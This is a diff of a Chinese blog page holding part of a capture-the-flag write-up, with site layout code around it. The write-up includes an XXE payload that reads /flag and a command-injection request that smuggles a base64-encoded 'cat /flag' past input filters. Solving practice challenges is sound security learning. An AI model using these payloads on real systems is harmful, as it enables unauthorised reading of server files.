+<h4 id="fungame"><a href="#fungame" class="headerlink" title="fungame"></a>fungame</h4><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128211344457.png" alt="image-20201128211344457" title="">
+                </div>
+                <div class="image-caption">image-20201128211344457</div>
+            </figure>
+
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> __encode =<span class="string">&#x27;jsjiami.com&#x27;</span>,_a=&#123;&#125;, _0xb483=[<span class="string">&quot;\x5F\x64\x65\x63\x6F\x64\x65&quot;</span>,<span class="string">&quot;\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C&quot;</span>];(<span class="function"><span class="keyword">function</span>(<span class="params">_0xd642x1</span>)</span>&#123;_0xd642x1[_0xb483[<span class="number">0</span>]]= _0xb483[<span class="number">1</span>]&#125;)(_a);<span class="keyword">var</span> __Oxa2781=[<span class="string">&quot;&quot;</span>,<span class="string">&quot;\x2D\x70\x61\x75\x73\x65\x64\x2D&quot;</span>,<span class="string">&quot;\x59\x6F\x75\x20\x57\x69\x6E\x21\x46\x6C\x61\x67\x20\x44\x4D\x63\x74\x66\x7B\x66\x6C\x61\x67\x5F\x69\x73\x5F\x68\x65\x72\x65\x7D\x21&quot;</span>,<span class="string">&quot;\x47\x61\x6D\x65\x20\x4F\x76\x65\x72\x21&quot;</span>,<span class="string">&quot;\x50\x72\x65\x73\x73\x20\x45\x73\x63\x61\x70\x65&quot;</span>,<span class="string">&quot;\x78&quot;</span>,<span class="string">&quot;\x79&quot;</span>,<span class="string">&quot;\x63\x65\x6E\x74\x65\x72&quot;</span>,<span class="string">&quot;\x75\x6E\x64\x65\x66\x69\x6E\x65\x64&quot;</span>,<span class="string">&quot;\x6C\x6F\x67&quot;</span>,<span class="string">&quot;\u5220\u9664&quot;</span>,<span class="string">&quot;\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A&quot;</span>,<span class="string">&quot;\u671F\u5F39\u7A97\uFF0C&quot;</span>,<span class="string">&quot;\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C&quot;</span>,<span class="string">&quot;\x6A\x73\x6A\x69\x61&quot;</span>,<span class="string">&quot;\x6D\x69\x2E\x63\x6F\x6D&quot;</span>];let bigText=__Oxa2781[<span class="number">0x0</span>];<span class="keyword">if</span>(paused)&#123;bigText= __Oxa2781[<span class="number">0x1</span>]&#125;;<span class="keyword">if</span>(winTimer.<span class="keyword">IsSet</span>())&#123;bigText= __Oxa2781[<span class="number">0x2</span>]&#125;;<span class="keyword">if</span>(player.IsDead())&#123;bigText= __Oxa2781[<span class="number">0x3</span>];DrawText(__Oxa2781[<span class="number">0x4</span>],mainCanvasSize[__Oxa2781[<span class="number">0x5</span>]]/ <span class="number">2</span>,mainCanvasSize[__Oxa2781[<span class="number">0x6</span>]]/ <span class="number">2</span>+ <span class="number">80</span>,<span class="number">42</span>)&#125;;DrawText(bigText,mainCanvasSize[__Oxa2781[<span class="number">0x5</span>]]/ <span class="number">2</span>,mainCanvasSize[__Oxa2781[<span class="number">0x6</span>]]/ <span class="number">2</span>- <span class="number">80</span>,<span class="number">72</span>,__Oxa2781[<span class="number">0x7</span>],<span class="number">2</span>);;;(<span class="function"><span class="keyword">function</span>(<span class="params">_0x5197x2,_0x5197x3,_0x5197x4,_0x5197x5,_0x5197x6,_0x5197x7</span>)</span>&#123;_0x5197x7= __Oxa2781[<span class="number">0x8</span>];_0x5197x5= <span class="function"><span class="keyword">function</span>(<span class="params">_0x5197x8</span>)</span>&#123;<span class="keyword">if</span>( typeof alert!== _0x5197x7)&#123;alert(_0x5197x8)&#125;;<span class="keyword">if</span>( typeof console!== _0x5197x7)&#123;console[__Oxa2781[<span class="number">0x9</span>]](_0x5197x8)&#125;&#125;;_0x5197x4= <span class="function"><span class="keyword">function</span>(<span class="params">_0x5197x9,_0x5197x2</span>)</span>&#123;<span class="keyword">return</span> _0x5197x9+ _0x5197x2&#125;;_0x5197x6= _0x5197x4(__Oxa2781[<span class="number">0xa</span>],_0x5197x4(_0x5197x4(__Oxa2781[<span class="number">0xb</span>],__Oxa2781[<span class="number">0xc</span>]),__Oxa2781[<span class="number">0xd</span>]));<span class="keyword">try</span>&#123;_0x5197x2= __encode;<span class="keyword">if</span>(!( typeof _0x5197x2!== _0x5197x7&amp;&amp; _0x5197x2=== _0x5197x4(__Oxa2781[<span class="number">0xe</span>],__Oxa2781[<span class="number">0xf</span>])))&#123;_0x5197x5(_0x5197x6)&#125;&#125;<span class="keyword">catch</span>(e)&#123;_0x5197x5(_0x5197x6)&#125;&#125;)(&#123;&#125;)</span><br></pre></td></tr></table></figure>
 
 <p>十六进制转ASCII</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128211910024.png" alt="image-20201128211910024"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128211910024.png" alt="image-20201128211910024" title="">
+                </div>
+                <div class="image-caption">image-20201128211910024</div>
+            </figure>
+
 <p>DMctf{flag_is_here}</p>
 <h4 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE user [  </span><br><span class="line">&lt;!ENTITY abc SYSTEM <span class="string">&quot;file:///flag&quot;</span>&gt; ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;&amp;abc;&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128212255102.png" alt="image-20201128212255102"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128212255102.png" alt="image-20201128212255102" title="">
+                </div>
+                <div class="image-caption">image-20201128212255102</div>
+            </figure>
+
 <p>dmctf{a3d52192-34b4-43d6-87a2-ddca16395da1}</p>
-<h4 id="pingpingping"><a href="#pingpingping" class="headerlink" title="pingpingping"></a>pingpingping</h4><p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128212429907.png" alt="image-20201128212429907"></p>
+<h4 id="pingpingping"><a href="#pingpingping" class="headerlink" title="pingpingping"></a>pingpingping</h4><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128212429907.png" alt="image-20201128212429907" title="">
+                </div>
+                <div class="image-caption">image-20201128212429907</div>
+            </figure>
+
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ping.php?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|`<span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IC9mbGFn$IFS$<span class="number">1</span>|$IFS$<span class="number">1</span>base64$IFS$<span class="number">1</span>-d` HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128212532930.png" alt="image-20201128212532930"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128212532930.png" alt="image-20201128212532930" title="">
+                </div>
+                <div class="image-caption">image-20201128212532930</div>
+            </figure>
+
 <p>dmctf{53325310-af8c-4490-92ae-7ea25c1ddebc}</p>
 
-  </div>
-  <footer class="article-footer">
-    
-  <div class="cc">
-    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.z" target="_blank" title="署名-相同方式共享">
-      <img src="/images/cc/cc.png">
-      
-          <img src="/images/cc/by.png">
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
         
-          <img src="/images/cc/sa.png">
-      
-      <span>
-        本作品采用知识共享 署名-相同方式共享 4.0 国际许可协议进行许可。
-      </span>
-    </a>
-  </div>
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">武英强</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2020/11/28/dmctf-writeup/">http://example.com/2020/11/28/dmctf-writeup/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">武英强</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
 
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/WriteUp/">
+                                    <span class="chip bg-color">WriteUp</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
 
     
 
-  </footer>
-</article>
-
-
-
-
-
-
-
-          <div class="main-footer">
-  
-    © 2021 会飞的鱼的Blog - Powered by <a href="http://hexo.io" target="_blank">Hexo</a> - Theme <a href="https://github.com/denjones/hexo-theme-chan" target="_blank">Chan</a>
-  
 </div>
 
-      
-        </div>
-      
-    </div>
-  </div>
-  
-<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
-
-
-  
-<link rel="stylesheet" href="/PhotoSwipe/photoswipe.css">
-
-  
-<link rel="stylesheet" href="/PhotoSwipe/default-skin/default-skin.css">
-
-
-  <!-- Root element of PhotoSwipe. Must have class pswp. -->
-  <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    <!-- Background of PhotoSwipe.
-             It's a separate element as animating opacity is faster than rgba(). -->
-    <div class="pswp__bg"></div>
-
-    <!-- Slides wrapper with overflow:hidden. -->
-    <div class="pswp__scroll-wrap">
-
-      <!-- Container that holds slides.
-                PhotoSwipe keeps only 3 of them in the DOM to save memory.
-                Don't modify these 3 pswp__item elements, data is added later on. -->
-      <div class="pswp__container">
-        <div class="pswp__item"></div>
-        <div class="pswp__item"></div>
-        <div class="pswp__item"></div>
-      </div>
-
-      <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
-      <div class="pswp__ui pswp__ui--hidden">
-
-        <div class="pswp__top-bar">
-
-          <!--  Controls are self-explanatory. Order can be changed. -->
-
-          <div class="pswp__counter"></div>
-
-          <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-          <button class="pswp__button pswp__button--share" title="Share"></button>
-
-          <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-          <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-          <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
-          <!-- element will get class pswp__preloader--active when preloader is running -->
-          <div class="pswp__preloader">
-            <div class="pswp__preloader__icn">
-              <div class="pswp__preloader__cut">
-                <div class="pswp__preloader__donut"></div>
-              </div>
+                </div>
             </div>
-          </div>
+            
         </div>
-
-        <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-          <div class="pswp__share-tooltip"></div>
-        </div>
-
-        <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
-
-        <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
-
-        <div class="pswp__caption">
-          <div class="pswp__caption__center"></div>
-        </div>
-      </div>
     </div>
-  </div>
 
-  
-<script src="/PhotoSwipe/photoswipe.js"></script>
+    
 
-  
-<script src="/PhotoSwipe/photoswipe-ui-default.js"></script>
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'xL8rbseQJWHC643SeDPTmyra-gzGzoHsz',
+        appKey: 'eDBc3tM9ty2QloRazNjbUjRh',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/01/05/ji-yu-github-pages-hexo-de-ge-ren-bo-ke-da-jian/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="基于Github Pages + Hexo的个人博客搭建">
+                        
+                        <span class="card-title">基于Github Pages + Hexo的个人博客搭建</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-05
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            武英强
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%8A%80%E6%9C%AF/">
+                        <span class="chip bg-color">技术</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/11/28/dmctf-writeup/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="DMCTF WriteUp">
+                        
+                        <span class="card-title">DMCTF WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            武英强
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
 
 
 
 
-<script src="/perfect-scrollbar/js/min/perfect-scrollbar.min.js"></script>
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2021</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">武英强</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/flyingfish20201" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
 
 
-<script src="/scripts/main.js"></script>
 
+    <a href="mailto:wyq123445@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
